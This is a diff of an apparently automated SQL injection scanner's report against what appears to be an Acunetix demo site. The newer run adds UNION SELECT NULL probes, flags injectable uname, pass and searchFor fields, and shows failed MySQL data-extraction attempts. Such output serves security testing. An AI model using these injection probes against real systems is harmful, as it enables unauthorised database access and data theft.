@@ -7,7 +7,7 @@
 |                                                                    |
 |  Request Method: POST                                              |
 |                                                                    |
-|  Crawl Depth: 1                                                    |
+|  Crawl Depth: 0                                                    |
 |                                                                    |
 +--------------------------------------------------------------------
 
@@ -31,7 +31,9 @@
 
        -> ' UNION SELECT NULL --  
        -> ' UNION SELECT NULL, NULL --  
-       -> ' UNION SELECT NULL, NULL, NULL -- 
+       -> ' UNION SELECT NULL, NULL, NULL --  
+       -> ' UNION SELECT NULL, NULL, NULL, NULL --  
+       -> ' UNION SELECT NULL, NULL, NULL, NULL, NULL -- 
 
 
 == Form tested: userinfo.php
@@ -39,43 +41,36 @@
 +-------+-------+---------+-------+
 | Input | error | boolean | union |
 +-------+-------+---------+-------+
-| uname |       |         |   V   |
-|  pass |       |         |       |
+| uname |   V   |         |   V   |
+|  pass |   V   |         |   V   |
 +-------+-------+---------+-------+
 
 
 == Form tested: search.php?test=query
 
-NO VULNERABILITY FOUND
++-----------+-------+---------+-------+
+|   Input   | error | boolean | union |
++-----------+-------+---------+-------+
+| searchFor |       |    V    |       |
++-----------+-------+---------+-------+
 
-== Form tested: 
-
-NO VULNERABILITY FOUND
-
-== Form tested: /secured/newuser.php
-
-NO VULNERABILITY FOUND
-
-== Form tested: //acunetix.us8.list-manage.com/subscribe/post?u=d7d847f8382b52d46a6547bcd&id=fbd39501d7
-
-NO VULNERABILITY FOUND
 
 ======================================================================
                            DATA EXTRACTION                            
 ======================================================================
 
-==> ENGINE: SQLite
+==> ENGINE: MySQL
 
 ==> TABLES
 
-Error: Table 'acuart.sqlite_master' doesn't exist
+Error: The used SELECT statements have a different number of columns
 
 ==> COLUMNS
 
-Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'sql FROM sqlite_master  -- ' AND pass='test'' at line 1
+Error: The used SELECT statements have a different number of columns
 
 ==> FULL DUMP
 
-Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'sql, '|') FROM sqlite_master WHERE type='table'--' AND pass='test'' at line 1
+Error: The used SELECT statements have a different number of columns
 
     ---------------------------- END ----------------------------     
